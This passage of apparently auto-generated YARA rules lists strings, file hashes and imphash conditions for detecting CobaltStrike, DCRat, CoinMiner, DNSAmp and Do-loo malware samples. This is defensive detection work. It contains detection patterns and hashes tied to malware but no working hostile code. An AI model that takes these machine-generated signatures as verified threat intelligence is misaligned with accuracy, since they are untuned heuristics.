      $s3 = "os/exec.(*Cmd).Start.gowrap1" fullword ascii /* score: '17.00'*/
      $s4 = "os/exec.(*Cmd).Start.gowrap2" fullword ascii /* score: '17.00'*/
      $s5 = "os.(*Process).handlePersistentRelease" fullword ascii /* score: '15.00'*/
      $s6 = "os.(*Process).handleTransientRelease" fullword ascii /* score: '15.00'*/
      $s7 = "B*struct { F uintptr; X0 chan exec.goroutineStatus; X1 chan error }" fullword ascii /* score: '15.00'*/
      $s8 = "type:.eq.os.ProcessState" fullword ascii /* score: '15.00'*/
      $s9 = "os.newHandleProcess" fullword ascii /* score: '15.00'*/
      $s10 = "*os.processMode" fullword ascii /* score: '15.00'*/
      $s11 = "type:.eq.struct { os/exec.in string; os/exec.out string }" fullword ascii /* score: '15.00'*/
      $s12 = "os.(*Process).handleTransientAcquire" fullword ascii /* score: '15.00'*/
      $s13 = "os.(*Process).closeHandle" fullword ascii /* score: '15.00'*/
      $s14 = "internal/sync.(*HashTrieMap[go.shape.struct { net/netip.isV6 bool; net/netip.zoneV6 string },go.shape.struct { weak._ [0]*go.sha" ascii /* score: '14.00'*/
      $s15 = "uct { net/netip.isV6 bool; net/netip.zoneV6 string }; weak.u unsafe.Pointer }]).compareAndDelete" fullword ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _DNSAmp_signature__Do_loo_signature__53 {
   meta:
      description = "_subset_batch - from files DNSAmp(signature).elf, Do-loo(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3f9edebbf0ba0a22729ec6324d6601e10cb44c84d4c9bd1af97aec64d22789d8"
      hash2 = "14df565ad794f723733f5db396ddcb5be4d43cffc4bad7dabd1f18193a0049a5"
   strings:
      $s1 = "(-(e)) != 35 || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)" fullword ascii /* score: '24.00'*/
      $s2 = "pthread_mutex_lock.c" fullword ascii /* score: '18.00'*/
      $s3 = "%s: line %d: bad command `%s'" fullword ascii /* score: '17.50'*/
      $s4 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii /* score: '16.50'*/
      $s5 = "((struct pthread *)__builtin_thread_pointer () - 1)->tid == ppid" fullword ascii /* score: '15.00'*/
      $s6 = "mutex->__data.__owner == 0" fullword ascii /* score: '15.00'*/
      $s7 = "spoofalert" fullword ascii /* score: '13.00'*/
      $s8 = "((((pagesize_m1 + 1) - 1) & (pagesize_m1 + 1)) == 0)" fullword ascii /* score: '12.00'*/
      $s9 = "inend - inptr > (state->__count & ~7)" fullword ascii /* score: '12.00'*/
      $s10 = "inptr - bytebuf > (state->__count & 7)" fullword ascii /* score: '12.00'*/
      $s11 = "inend - *inptrp < 4" fullword ascii /* score: '12.00'*/
      $s12 = "(bitmask_nwords & (bitmask_nwords - 1)) == 0" fullword ascii /* score: '12.00'*/
      $s13 = "previous_prio == -1 || (previous_prio >= __sched_fifo_min_prio && previous_prio <= __sched_fifo_max_prio)" fullword ascii /* score: '11.00'*/
      $s14 = "new_prio == -1 || (new_prio >= __sched_fifo_min_prio && new_prio <= __sched_fifo_max_prio)" fullword ascii /* score: '11.00'*/
      $s15 = "%s: line %d: list delimiter not followed by domain" fullword ascii /* score: '9.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _CobaltStrike_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008_54 {
   meta:
      description = "_subset_batch - from files CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash2 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash3 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash4 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash5 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash6 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
   strings:
      $s1 = "runtime.mutexSampleContention" fullword ascii /* score: '26.00'*/
      $s2 = "e failed; errno=runtime: malformed profBuf buffer - invalid sizeruntime: taggedPointerPack invalid packing: ptr=attempt to trace" ascii /* score: '25.00'*/
      $s3 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '23.00'*/
      $s4 = "updateMaxProcsGoroutine: phase errorruntime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong gorou" ascii /* score: '21.00'*/
      $s5 = " s.sweepgen= allocCount page summaryProcessPrng" fullword ascii /* score: '20.00'*/
      $s6 = "ts added out of order or overlappingmheap.freeSpanLocked - invalid stack freemheap.freeSpanLocked - invalid span stateattempted " ascii /* score: '19.00'*/
      $s7 = "internal/runtime/maps.mapKeyError2" fullword ascii /* score: '18.00'*/
      $s8 = "work.nprocleft over markroot jobsgcDrain phase incorrectMB during sweep; swept bad profile stack countruntime: netpoll failedpan" ascii /* score: '18.00'*/
      $s9 = "runtime.dumpScanStats" fullword ascii /* score: '16.00'*/
      $s10 = "internal/runtime/atomic.(*Pointer[go.shape.5f566b8060af5dcf2bb32599f0d90d9b6c002cd445f22159b86edf45e23a5dae]).CompareAndSwapNoWB" ascii /* score: '16.00'*/
      $s11 = "runtime.globrunqgetbatch" fullword ascii /* score: '15.00'*/
      $s12 = "/non-default-behavior/bcryptprimitives.dll not foundpanic called with nil argumentcheckdead: inconsistent countsrunqputslow: que" ascii /* score: '15.00'*/
      $s13 = "tempted to trace stack of a goroutine this thread does not ownuser arena chunk size is not a multiple of the physical page sizer" ascii /* score: '15.00'*/
      $s14 = "system huge page size (runtime: s.allocCount= s.allocCount > s.nelems/gc/heap/allocs:objectsruntime: internal errorwork.nwait > " ascii /* score: '15.00'*/
      $s15 = "runtime.getCleanupContext" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _CoinMiner_signature__dcaf48c1f10b0efa0a4472200f3850ed_imphash__1a3b95a5_dcaf48c1f10b0efa0a4472200f3850ed_imphash__1a88146b__55 {
   meta:
      description = "_subset_batch - from files CoinMiner(signature)_dcaf48c1f10b0efa0a4472200f3850ed(imphash)_1a3b95a5.exe, dcaf48c1f10b0efa0a4472200f3850ed(imphash)_1a88146b.exe, dcaf48c1f10b0efa0a4472200f3850ed(imphash)_a990bd13.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1a3b95a51b678ad1377e7fe671933ccba1056563003d5db181ad7c2d2936edf7"
      hash2 = "1a88146b43782a3547bcc06236a4b224592c1602a9691b58d60be1c08e4fa4b7"
      hash3 = "a990bd137feb5751e17c135c6b11fcaf6a7f09d1b3935b2d76ebfd0d53a2f027"
   strings:
      $s1 = "%ls\\ucrtbase.dll" fullword wide /* score: '20.00'*/
      $s2 = "Failed to execute script '%ls' due to unhandled exception: %ls" fullword wide /* score: '20.00'*/
      $s3 = "Path of ucrtbase.dll (%ls) and its name exceed buffer size (%d)." fullword wide /* score: '19.00'*/
      $s4 = "Failed to set _PYI_PARENT_PROCESS_LEVEL environment variable!" fullword ascii /* score: '18.00'*/
      $s5 = "Failed to construct path to base_library.zip - path is too long!" fullword ascii /* score: '18.00'*/
      $s6 = "Invalid parent process level: %d" fullword ascii /* score: '15.00'*/
      $s7 = "PyInitConfig_GetError" fullword ascii /* score: '15.00'*/
      $s8 = "Failed to construct path to lib-dynload directory - path is too long!" fullword ascii /* score: '15.00'*/
      $s9 = "Failed to import symbol %hs from Python DLL." fullword wide /* score: '15.00'*/
      $s10 = "Failed to import symbol %hs from Tcl DLL." fullword wide /* score: '15.00'*/
      $s11 = "Failed to import symbol %hs from Tk DLL." fullword wide /* score: '15.00'*/
      $s12 = "Traceback is disabled via bootloader option." fullword ascii /* score: '13.00'*/
      $s13 = "Path of Python DLL (%ls) and its name (%hs) exceed buffer size (%d)." fullword wide /* score: '12.00'*/
      $s14 = "Failed to convert path to Tcl DLL to wide-char string." fullword wide /* score: '12.00'*/
      $s15 = "Failed to load Tcl DLL '%ls'." fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and pe.imphash() == "dcaf48c1f10b0efa0a4472200f3850ed" and ( 8 of them )
      ) or ( all of them )
}

rule _CobaltStrike_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__CobaltStrike_signature__d42595b695fc008ef2c56aabd8efd68e__56 {
   meta:
      description = "_subset_batch - from files CobaltStrike(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_4970e957.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_634ff4b4.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7ed53caf.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_9d83c505.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_f8818a24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4390de792c33fb358e49444f5c40349d2f0929ccf1820b98bc4c29cd08ef475c"
      hash2 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash3 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash4 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash5 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash6 = "4970e95727c983c9fc09673db8e3a852c135fdcb74c60ce8b927808eb767f115"
      hash7 = "634ff4b4130189a88f970b2ee8c14109f52b20b51cef431bd4c65e9023a704c1"
      hash8 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash9 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash10 = "7ed53cafeb7ec84dbcd378cb16d732466ba9d3ed83a97c4b4a4dbd7ab7efe345"
      hash11 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash12 = "9d83c5056348b6a80c16232a49050485d3917ba93f1310921a9e7e4666142cf7"
      hash13 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash14 = "f8818a247bfdfd7017a4c57867dc9f4f0ff9a59c792ad2c5652551a695b1a9a6"
   strings:
      $s1 = "runtime.getlasterror" fullword ascii /* score: '18.00'*/
      $s2 = "*syscall.DLL" fullword ascii /* score: '16.00'*/
      $s3 = "runtime.getPageSize" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.initLongPathSupport" fullword ascii /* score: '13.00'*/
      $s5 = "internal/abi.(*IntArgRegBitmap).Get" fullword ascii /* score: '12.00'*/
      $s6 = "*syscall.DLLError" fullword ascii /* score: '12.00'*/
      $s7 = "aeshashbody" fullword ascii /* score: '11.00'*/
      $s8 = "syscall.getprocaddress" fullword ascii /* score: '11.00'*/
      $s9 = "runtime.firstcontinuetramp" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.semacreate.func2" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.stackcheck" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.lastcontinuetramp" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.arenaIdx.l2" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.initHighResTimer" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.semawakeup.func1" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__41b402ff_d42595b695fc008ef2c56aabd8efd6_57 {
   meta:
      description = "_subset_batch - from files d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash2 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash3 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
   strings:
      $s1 = "Planned forward compatible bundle: %1!ls!, default requested: %2!hs!, ba requested: %3!hs!, execute: %4!hs!, rollback: %5!hs!, d" ascii /* score: '22.00'*/
      $s2 = "ImoSetup.exe" fullword wide /* score: '22.00'*/
      $s3 = "Plan skipped dependent bundle repair: %1!ls!, type: %2!hs!, because no packages are being executed during this uninstall operati" ascii /* score: '15.00'*/
      $s4 = "Plan skipped related bundle: %1!ls!, type: %2!hs!, because it was dependent and the current bundle is being executed as type: %3" ascii /* score: '14.00'*/
      $s5 = "Planned related bundle: %1!ls!, type: %2!hs!, default requested: %3!hs!, ba requested: %4!hs!, execute: %5!hs!, rollback: %6!hs!" ascii /* score: '14.00'*/
      $s6 = "Planned feature: %1!ls!, state: %2!hs!, default requested: %3!hs!, ba requested: %4!hs!, execute action: %5!hs!, rollback action" ascii /* score: '14.00'*/
      $s7 = "Planned upgrade bundle: %1!ls!, default requested: %2!hs!, ba requested: %3!hs!, execute: %4!hs!, rollback: %5!hs!, dependency: " ascii /* score: '14.00'*/
      $s8 = "<http://cert.ssl.com/SSLcom-SubCA-CodeSigning-RSA-4096-R1.cer0Q" fullword ascii /* score: '13.00'*/
      $s9 = "<http://crls.ssl.com/SSLcom-SubCA-CodeSigning-RSA-4096-R1.crl0" fullword ascii /* score: '13.00'*/
      $s10 = "+SSL.com Code Signing Intermediate CA RSA R10" fullword ascii /* score: '12.00'*/
      $s11 = "+SSL.com Code Signing Intermediate CA RSA R1" fullword ascii /* score: '12.00'*/
      $s12 = "Plan skipped related bundle: %1!ls!, type: %2!hs!, because it was dependent and the current bundle is being executed as type: %3" ascii /* score: '10.00'*/
      $s13 = "Planned package: %1!ls!, state: %2!hs!, default requested: %3!hs!, ba requested: %4!hs!, execute: %5!hs!, rollback: %6!hs!, cach" ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _CobaltStrike_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__72d757ad_d42595_58 {
   meta:
      description = "_subset_batch - from files CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash2 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash3 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
   strings:
      $s1 = "on a locked thread with no template threadunexpected signal during runtime executionstop of synctest timer from outside bubbletr" ascii /* score: '21.00'*/
      $s2 = "type:.eq.golang.org/x/sys/windows.DLL" fullword ascii /* score: '20.00'*/
      $s3 = "type:.eq.golang.org/x/sys/windows.DLLError" fullword ascii /* score: '19.00'*/
      $s4 = "golang.org/x/sys/windows.(*DLLError).Unwrap" fullword ascii /* score: '18.00'*/
      $s5 = "C:/Program Files/Go/src/internal/sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s6 = "golang.org/x/sys/windows.(*LazyDLL).Load.deferwrap1" fullword ascii /* score: '15.00'*/
      $s7 = "type:.eq.golang.org/x/sys/windows.LazyDLL" fullword ascii /* score: '12.00'*/
      $s8 = "internal/syscall/windows.ProcessPrng" fullword ascii /* score: '11.00'*/
      $s9 = "golang.org/x/sys/windows.(*LazyProc).Find.deferwrap1" fullword ascii /* score: '10.00'*/
      $s10 = "crypto/internal/fips140/aes.encryptBlockAsm" fullword ascii /* score: '9.00'*/
      $s11 = "kernel32H9" fullword ascii /* score: '9.00'*/
      $s12 = "indexbody" fullword ascii /* score: '8.00'*/
      $s13 = "internal/syscall/windows.GetSystemDirectory" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__1fc8d079_d42595b695fc008ef2c56aabd8efd6_59 {
   meta:
      description = "_subset_batch - from files d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_4970e957.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_634ff4b4.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7ed53caf.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_9d83c505.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_f8818a24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash2 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash3 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash4 = "4970e95727c983c9fc09673db8e3a852c135fdcb74c60ce8b927808eb767f115"
      hash5 = "634ff4b4130189a88f970b2ee8c14109f52b20b51cef431bd4c65e9023a704c1"
      hash6 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash7 = "7ed53cafeb7ec84dbcd378cb16d732466ba9d3ed83a97c4b4a4dbd7ab7efe345"
      hash8 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash9 = "9d83c5056348b6a80c16232a49050485d3917ba93f1310921a9e7e4666142cf7"
      hash10 = "f8818a247bfdfd7017a4c57867dc9f4f0ff9a59c792ad2c5652551a695b1a9a6"
   strings:
      $x1 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '38.00'*/
      $s2 = "r spinbit mutexmin size of malloc header is not a size class boundarygcControllerState.findRunnable: blackening not enabledno go" ascii /* score: '19.00'*/
      $s3 = "runtime/rwmutex.go" fullword ascii /* score: '18.00'*/
      $s4 = "internal/sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s5 = "sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s6 = "on a locked thread with no template threadunexpected signal during runtime executiontraceStopReadCPU called with trace enabledat" ascii /* score: '15.00'*/
      $s7 = "runtime/fastlog2.go" fullword ascii /* score: '12.00'*/
      $s8 = "runtime/mgcsweep.go" fullword ascii /* score: '12.00'*/
      $s9 = "runtime/time_nofake.go" fullword ascii /* score: '12.00'*/
      $s10 = "routines (main called runtime.Goexit) - deadlock!trace: non-empty full trace buffer for done generationtrace: non-empty full tra" ascii /* score: '11.00'*/
      $s11 = "runtime/error.go" fullword ascii /* score: '10.00'*/
      $s12 = "runtime/stkframe.go" fullword ascii /* score: '10.00'*/
      $s13 = "runtime/hash64.go" fullword ascii /* score: '10.00'*/
      $s14 = "runtime/symtabinl.go" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _DCRat_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__DCRat_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__3ef18_60 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash).exe, DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_3ef183c1.exe, DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_bca5ffb9.exe, DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_cfc77b95.exe, DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_da0732b5.exe, DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_def52e7b.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0d1f7174.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_136b0073.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_46fdd73b.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5ca0a3b3.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b072ea47.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_de3f60d3.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f9875282.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7d398ca598c96de79cbdaaa3dc88abf06da245c7cd2c53b7f6f6bf3732b3b46b"
      hash2 = "3ef183c187c16072e3d1644a20f080d8c39727ed1d25e8c869748979825d26db"
      hash3 = "bca5ffb9737d1a5153b454a1ad91c91340c7176b31ef102f7958042818e031fa"
      hash4 = "cfc77b951766dcdaee1adc05717ebb379972293ea21f8967dfc507e3b1f5e424"
      hash5 = "da0732b540cf55107d03e09ffcf0d6c57a733c01a9ccac2c0fcd7ec2cf24f12d"
      hash6 = "def52e7b2167ed5ff5d2e0b514558328efac9ddf0ece129dd9ce87046d43a6d3"
      hash7 = "0d1f717457b9300e23d20d37dd7482cbb588d0332c7fbd9b936469f6e917f49e"
      hash8 = "136b0073f9ecd1e06156f5cb4b77466a2c6af1354445fce4a350b2c241c20e1e"
      hash9 = "46fdd73b266776ebd56d484c0833ace94a2cae4d5c01413b1f240c21923eb364"
      hash10 = "5ca0a3b3c82ae44d4f9dd1a9b7246bc03bb9a299372f142244a63f11496669a3"
      hash11 = "b072ea4772e83b2881e8391a4e52d416e3d4bdf56f89abd3fb296bc2932a3747"
      hash12 = "de3f60d3fecad3572199d1342f5c5051810c30ebe2dfa0f0566dd6d1bcc475e1"
      hash13 = "f9875282eec8dd6f9c8586ecc389cb28816c9feb7ce4ddff6720c47c4942d380"
   strings:
      $s1 = "KernelBase.dll" fullword ascii /* score: '23.00'*/
      $s2 = "SpotifyStartupTask.exe" fullword wide /* score: '22.00'*/
      $s3 = "System.Collections.Generic.IEnumerable<ns64.B45>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s4 = "System.Collections.Generic.ICollection<H37.o75>.get_IsReadOnly" fullword ascii /* score: '15.00'*/
      $s5 = "System.Collections.Generic.IEnumerator<ns64.B45>.get_Current" fullword ascii /* score: '15.00'*/
      $s6 = "System.Collections.Generic.IList<H37.o75>.get_Item" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.IEnumerable<H37.o75>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s8 = "System.Collections.Generic.ICollection<H37.o75>.get_Count" fullword ascii /* score: '15.00'*/
      $s9 = "System.IO.Stream.get_Length" fullword ascii /* score: '12.00'*/
      $s10 = "System.IO.Stream.get_Position" fullword ascii /* score: '12.00'*/
      $s11 = "System.Collections.Generic.IEnumerator<ns89.Class64>.get_Current" fullword ascii /* score: '11.00'*/
      $s12 = "System.Collections.Generic.IEnumerable<ns89.Class64>.GetEnumerator" fullword ascii /* score: '11.00'*/
      $s13 = "System.Object.Finalize" fullword ascii /* score: '10.00'*/
      $s14 = "System.Collections.Generic.ICollection<H37.o75>.Remove" fullword ascii /* score: '10.00'*/
      $s15 = "System.Collections.Generic.IList<H37.o75>.RemoveAt" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _CobaltStrike_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008_61 {
   meta:
      description = "_subset_batch - from files CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_4970e957.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_634ff4b4.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7ed53caf.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_9d83c505.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_f8818a24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash2 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash3 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash4 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash5 = "4970e95727c983c9fc09673db8e3a852c135fdcb74c60ce8b927808eb767f115"
      hash6 = "634ff4b4130189a88f970b2ee8c14109f52b20b51cef431bd4c65e9023a704c1"
      hash7 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash8 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash9 = "7ed53cafeb7ec84dbcd378cb16d732466ba9d3ed83a97c4b4a4dbd7ab7efe345"
      hash10 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash11 = "9d83c5056348b6a80c16232a49050485d3917ba93f1310921a9e7e4666142cf7"
      hash12 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash13 = "f8818a247bfdfd7017a4c57867dc9f4f0ff9a59c792ad2c5652551a695b1a9a6"
   strings:
      $s1 = "runtime.mutexWaitListHead" fullword ascii /* score: '26.00'*/
      $s2 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '23.00'*/
      $s3 = "runtime.mutexPreferLowLatency" fullword ascii /* score: '21.00'*/
      $s4 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '18.00'*/
      $s5 = "runtime.preventErrorDialogs" fullword ascii /* score: '18.00'*/
      $s6 = "type:.eq.syscall.DLL" fullword ascii /* score: '16.00'*/
      $s7 = "runtime.getGCMaskOnDemand.osyield.func2" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.pollOperationFromOverlappedEntry" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.getfp" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.pinnerGetPtr" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.Pinner: object already unpinnedsuspendG from non-preemptible goroutineruntime: casfrom_Gscanstatus failed gp=stack growt" ascii /* score: '14.00'*/
      $s12 = "runtime.sysmon.usleep.func1" fullword ascii /* score: '14.00'*/
